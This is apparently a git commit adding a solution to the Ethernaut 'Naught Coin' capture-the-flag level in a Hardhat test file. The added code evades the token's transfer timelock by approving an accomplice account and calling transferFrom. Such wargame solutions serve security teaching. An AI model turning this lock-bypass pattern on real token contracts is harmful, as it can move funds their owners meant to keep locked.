174aabe4ddd5a478e8adefd971bfd357e28f927c
0xToshii <94262432+0xToshii@users.noreply.github.com>
2022-08-20 18:42:32 -0700

    naught coin

--- test/15-naught-coin.ts
+++ test/15-naught-coin.ts
@@ -5,13 +5,14 @@ import { createChallenge, submitLevel } from "./utils";
 
 let accounts: Signer[];
 let eoa: Signer;
+let accomplice: Signer;
 let attacker: Contract;
 let challenge: Contract; // challenge contract
 let tx: any;
 
 before(async () => {
   accounts = await ethers.getSigners();
-  [eoa] = accounts;
+  [eoa, accomplice] = accounts;
   const challengeFactory = await ethers.getContractFactory(`NaughtCoin`);
   const challengeAddress = await createChallenge(
     `0x096bb5e93a204BfD701502EB6EF266a950217218`
@@ -20,6 +21,14 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+
+  let eoaAddress = await eoa.getAddress()
+  let accAddress = await accomplice.getAddress()
+  let playerAmount = await challenge.balanceOf(await eoa.getAddress())
+
+  await challenge.connect(eoa).approve(accAddress,playerAmount)
+  await challenge.connect(accomplice).transferFrom(eoaAddress,accAddress,playerAmount)
+
 });
 
 after(async () => {
